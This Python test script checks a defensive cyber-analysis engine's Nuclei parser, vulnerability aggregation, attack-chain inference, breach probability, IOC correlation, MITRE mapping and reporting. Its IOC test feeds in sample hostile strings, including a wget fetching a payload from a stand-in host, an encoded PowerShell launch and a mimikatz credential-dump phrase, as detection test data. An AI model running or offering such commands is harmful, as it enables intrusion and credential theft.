"""
Chhoti Don - Cyber Engine Test Suite
Advanced test runner for all cyber engine components.
Tests: CyberController, attack chain, heatmap, priority, aggregation
Run: python test_cyber_engine.py
Phase 2.2 - Full Upgrade
"""

import sys
import os
import time
import datetime
import json
from typing import Generator

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))


# ==================================================
# 🎨 CONSOLE HELPERS
# ==================================================

class Colors:
    """Class Description"""
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    RED = "\033[91m"
    BLUE = "\033[94m"
    CYAN = "\033[96m"
    MAGENTA = "\033[95m"
    WHITE = "\033[97m"
    RESET = "\033[0m"
    BOLD = "\033[1m"


def print_header(title: str, num: int = None) -> None:
    num_str = f"[TEST {num:02d}] " if num else ""
    print(f"\n{Colors.BOLD}{Colors.CYAN}{'=' * 60}{Colors.RESET}")
    print(f"{Colors.BOLD}{Colors.CYAN}  🛡️  {num_str}{title}{Colors.RESET}")
    print(f"{Colors.BOLD}{Colors.CYAN}{'=' * 60}{Colors.RESET}")


def print_result(result, label: str = "Result") -> None:
    if isinstance(result, dict):
        status = result.get("status", "unknown")
        icon = "✅" if status in ["success", "completed"] else "❌" if status == "error" else "📊"
        color = Colors.GREEN if icon == "✅" else Colors.RED if icon == "❌" else Colors.BLUE
        print(f"\n  {icon} {color}Status: {status.upper()}{Colors.RESET}")

        for key, value in result.items():
            if key == "status":
                continue
            if value is None:
                continue
            val_str = json.dumps(value, indent=2) if isinstance(value, (dict, list)) else str(value)
            if len(val_str) > 500:
                val_str = val_str[:500] + "...[truncated]"
            print(f"  {Colors.BLUE}📌 {key:<22}{Colors.RESET}: {val_str}")
    else:
        print(f"  {Colors.BLUE}📌 {label:<22}{Colors.RESET}: {str(result)[:400]}")


def print_section(title: str) -> None:
    print(f"\n{Colors.BOLD}{Colors.MAGENTA}  ▶ {title}{Colors.RESET}")


    """Class Description"""
class TestTracker:
    def __init__(self):
        self.passed = self.failed = self.skipped = 0
        self.results = []
        self.start_time = time.time()

    def record(self, name: str, passed: bool, note: str = "") -> None:
        if passed:
            self.passed += 1
            print(f"  {Colors.GREEN}✅ PASS: {name}{Colors.RESET}")
        else:
            self.failed += 1
            print(f"  {Colors.RED}❌ FAIL: {name} — {note}{Colors.RESET}")
        self.results.append({"name": name, "passed": passed})

    def skip(self, name: str, reason: str) -> None:
        self.skipped += 1
        print(f"  {Colors.YELLOW}⏭️  SKIP: {name} — {reason}{Colors.RESET}")

    def summary(self) -> None:
        duration = round(time.time() - self.start_time, 2)
        total = self.passed + self.failed + self.skipped
        print(f"\n{Colors.BOLD}{'=' * 60}{Colors.RESET}")
        print(f"{Colors.BOLD}  📊 CYBER ENGINE TEST SUMMARY{Colors.RESET}")
        print(f"{'=' * 60}")
        print(f"  {Colors.GREEN}✅ Passed  : {self.passed}/{total}{Colors.RESET}")
        print(f"  {Colors.RED}❌ Failed  : {self.failed}/{total}{Colors.RESET}")
        if self.skipped:
            print(f"  {Colors.YELLOW}⏭️  Skipped : {self.skipped}/{total}{Colors.RESET}")
        print(f"  ⏱️  Duration: {duration}s")

        if self.failed == 0:
            print(f"\n  {Colors.GREEN}{Colors.BOLD}🎉 ALL CYBER ENGINE TESTS PASSED!{Colors.RESET}")
        else:
            print(f"\n  {Colors.YELLOW}⚠️  {self.failed} test(s) failed{Colors.RESET}")
        print(f"{'=' * 60}\n")


tracker = TestTracker()


# ==================================================
# 🔧 IMPORT CYBER CONTROLLER
# ==================================================

print_header("CHHOTI DON CYBER ENGINE TEST SUITE")
print(f"  📅 {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")

try:
    from cyber_engine.cyber_controller import CyberController
    controller = CyberController()
    print(f"  {Colors.GREEN}✅ CyberController imported successfully{Colors.RESET}")
except ImportError as e:
    print(f"  {Colors.RED}❌ CyberController import failed: {e}{Colors.RESET}")
    sys.exit(1)


# ==================================================
# 🔍 TEST 1 — ENGINE INFO
# ==================================================

print_section("ENGINE TESTS")
print_header("ENGINE INFO", 1)

try:
    info = controller.engine_info()
    print_result(info)
    tracker.record("Engine Info", isinstance(info, dict))
except Exception as e:
    print(f"  {Colors.RED}Error: {e}{Colors.RESET}")
    tracker.record("Engine Info", False, str(e))


# ==================================================
# 🔍 TEST 2 — NUCLEI PARSER
# ==================================================

print_header("NUCLEI OUTPUT PARSER", 2)

nuclei_json = '''
{"template-id":"credential-leak","severity":"critical","matched-at":"http://test.local/login","info":{"name":"Credential Leak"}}
{"template-id":"rce-check","severity":"high","matched-at":"http://test.local/api","info":{"name":"Remote Code Execution"}}
{"template-id":"sqli-detection","severity":"high","matched-at":"http://test.local/search","info":{"name":"SQL Injection"}}
{"template-id":"xss-reflected","severity":"medium","matched-at":"http://test.local/search","info":{"name":"Reflected XSS"}}
{"template-id":"info-disclosure","severity":"low","matched-at":"http://test.local/robots.txt","info":{"name":"Info Disclosure"}}
'''

try:
    nuclei_result = controller.analyze_nuclei_output(nuclei_json)
    print_result(nuclei_result)
    findings = nuclei_result.get("data", {}).get("findings", [])
    tracker.record("Nuclei Parser", len(findings) > 0, f"Found {len(findings)} findings")
except Exception as e:
    print(f"  {Colors.RED}Error: {e}{Colors.RESET}")
    tracker.record("Nuclei Parser", False, str(e))
    findings = []


# ==================================================
# 🔍 TEST 3 — VULNERABILITY AGGREGATION
# ==================================================

print_header("VULNERABILITY AGGREGATION", 3)

sample_findings = [
    {"type": "sql_injection", "severity": "critical", "port": 80, "service": "http", "cvss": 9.8},
    {"type": "xss", "severity": "high", "port": 443, "service": "https", "cvss": 7.5},
    {"type": "open_port", "severity": "medium", "port": 22, "service": "ssh"},
    {"type": "weak_credentials", "severity": "high", "port": 22, "service": "ssh"},
    {"type": "sql_injection", "severity": "critical", "port": 80, "service": "http", "cvss": 9.8},  # Duplicate
    {"type": "csrf", "severity": "medium", "port": 80, "service": "http"},
    {"type": "ransomware", "severity": "critical", "cvss": 10.0, "exploit_available": True},
]

try:
    agg_result = controller.aggregate_findings({"findings": sample_findings})
    print_result(agg_result)
    total = agg_result.get("data", {}).get("total_findings", 0)
    deduped = agg_result.get("data", {}).get("deduplicated_count", 0)
    tracker.record("Vulnerability Aggregation", total > 0, f"Total: {total}, Deduped: {deduped}")
except Exception as e:
    print(f"  {Colors.RED}Error: {e}{Colors.RESET}")
    tracker.record("Vulnerability Aggregation", False, str(e))


# ==================================================
# 🔍 TEST 4 — ATTACK CHAIN INFERENCE
# ==================================================

print_section("THREAT INTELLIGENCE TESTS")
print_header("ATTACK CHAIN INFERENCE", 4)

chain_findings = [
    {"type": "port_scan", "description": "Network reconnaissance nmap scan"},
    {"type": "sql_injection", "description": "RCE via exploit T1190"},
    {"type": "privilege_escalation", "description": "Sudo misconfiguration T1068"},
    {"type": "credential_access", "description": "Credential leak T1552 mimikatz"},
    {"type": "lateral_movement", "description": "SMB pass the hash T1021"},
    {"type": "ransomware", "description": "Data encrypted for impact T1486"},
]

try:
    chain_result = controller.infer_attack_chain(chain_findings)
    print_result(chain_result)
    stages = chain_result.get("data", {}).get("detected_stages", [])
    tracker.record("Attack Chain Inference", len(stages) > 0, f"Stages: {stages}")
except Exception as e:
    print(f"  {Colors.RED}Error: {e}{Colors.RESET}")
    tracker.record("Attack Chain Inference", False, str(e))
    stages = []


# ==================================================
# 🔍 TEST 5 — ATTACK GRAPH
# ==================================================

print_header("ATTACK GRAPH BUILDER", 5)

try:
    graph_result = controller.build_attack_graph(stages or ["initial_access", "lateral_movement", "impact"])
    print_result(graph_result)
    tracker.record("Attack Graph Builder", graph_result.get("status") in ["success", "completed"])
except Exception as e:
    print(f"  {Colors.RED}Error: {e}{Colors.RESET}")
    tracker.record("Attack Graph Builder", False, str(e))
    graph_result = {"data": {}}


# ==================================================
# 🔍 TEST 6 — BREACH PROBABILITY
# ==================================================

print_header("BREACH PROBABILITY ESTIMATION", 6)

try:
    weighted = controller.calculate_edge_weights(graph_result.get("data", {}))
    prob_result = controller.estimate_breach_probability(weighted.get("data", {}))
    print_result(prob_result)
    breach_prob = prob_result.get("data", {}).get("breach_probability", 0)
    tracker.record("Breach Probability", isinstance(breach_prob, (int, float)), f"Probability: {breach_prob}")
except Exception as e:
    print(f"  {Colors.RED}Error: {e}{Colors.RESET}")
    tracker.record("Breach Probability", False, str(e))
    breach_prob = 0.5


# ==================================================
# 🔍 TEST 7 — THREAT HEATMAP
# ==================================================

print_header("THREAT HEATMAP GENERATION", 7)

try:
    heatmap_result = controller.generate_threat_heatmap(
        stages or ["initial_access", "credential_access", "lateral_movement"],
        breach_prob or 0.6
    )
    print_result(heatmap_result)
    heatmap_data = heatmap_result.get("data", {})
    tracker.record("Threat Heatmap", bool(heatmap_data.get("stage_heatmap")))
except Exception as e:
    print(f"  {Colors.RED}Error: {e}{Colors.RESET}")
    tracker.record("Threat Heatmap", False, str(e))
    heatmap_data = {}


# ==================================================
# 🔍 TEST 8 — PRIORITY ENGINE
# ==================================================

print_section("INTELLIGENCE TESTS")
print_header("PRIORITY ENGINE", 8)

try:
    priority_result = controller.prioritize_findings(
        sample_findings,
        heatmap_data,
        breach_prob or 0.6
    )
    print_result(priority_result)
    top = priority_result.get("data", {}).get("top_priority", [])
    tracker.record("Priority Engine", len(top) > 0, f"Top {len(top)} priorities")
except Exception as e:
    print(f"  {Colors.RED}Error: {e}{Colors.RESET}")
    tracker.record("Priority Engine", False, str(e))


# ==================================================
# 🔍 TEST 9 — IOC CORRELATOR
# ==================================================

print_header("IOC CORRELATOR", 9)

suspicious_strings = [
    "cmd.exe /c powershell -enc base64encodedpayload",
    "Connection to 192.168.1.100:4444 established",
    "mimikatz lsass dump credentials",
    "http://malicious-c2.onion/beacon",
    "bitcoin:1BvBMSEYstWetqTFn5Au4m4GFg7xJaNVN2",
    "wget http://evil.xyz/payload.sh",
    "CVE-2017-0144 EternalBlue exploit",
]

try:
    ioc_result = controller.correlate_iocs(suspicious_strings)
    print_result(ioc_result)
    ioc_count = ioc_result.get("data", {}).get("total_iocs_found", 0)
    tracker.record("IOC Correlator", ioc_count > 0, f"IOCs: {ioc_count}")
except Exception as e:
    print(f"  {Colors.RED}Error: {e}{Colors.RESET}")
    tracker.record("IOC Correlator", False, str(e))


# ==================================================
# 🔍 TEST 10 — MITRE MAPPER
# ==================================================

print_header("MITRE ATT&CK MAPPER", 10)

scan_data = {
    "open_port_details": [
        {"port": 22, "service": "ssh", "version": "OpenSSH 7.4"},
        {"port": 445, "service": "smb", "version": "Samba 4.0"},
        {"port": 3389, "service": "rdp"},
        {"port": 6379, "service": "redis"},
    ],
    "findings": chain_findings,
}

try:
    mitre_result = controller.map_mitre_techniques(scan_data)
    print_result(mitre_result)
    tracker.record("MITRE Mapper", mitre_result.get("status") in ["success", "completed"])
except Exception as e:
    print(f"  {Colors.RED}Error: {e}{Colors.RESET}")
    tracker.record("MITRE Mapper", False, str(e))


# ==================================================
# 🔍 TEST 11 — RISK CALCULATOR
# ==================================================

print_header("RISK CALCULATOR", 11)

try:
    risk_result = controller.calculate_risk(sample_findings)
    print_result(risk_result)
    risk_score = risk_result.get("data", {}).get("risk_score", 0)
    tracker.record("Risk Calculator", isinstance(risk_score, (int, float)), f"Score: {risk_score}")
except Exception as e:
    print(f"  {Colors.RED}Error: {e}{Colors.RESET}")
    tracker.record("Risk Calculator", False, str(e))


# ==================================================
# 🔍 TEST 12 — REPORT GENERATOR
# ==================================================

print_section("REPORTING TESTS")
print_header("REPORT GENERATOR", 12)

try:
    report_result = controller.generate_report(
        target="test.local",
        findings=sample_findings,
        threat_summary={"threat_score": 85, "threat_level": "Severe"},
    )
    print_result(report_result)
    tracker.record("Report Generator", report_result.get("status") in ["success", "completed"])
except Exception as e:
    print(f"  {Colors.RED}Error: {e}{Colors.RESET}")
    tracker.record("Report Generator", False, str(e))


# ==================================================
# 📊 FINAL SUMMARY
# ==================================================

tracker.summary()
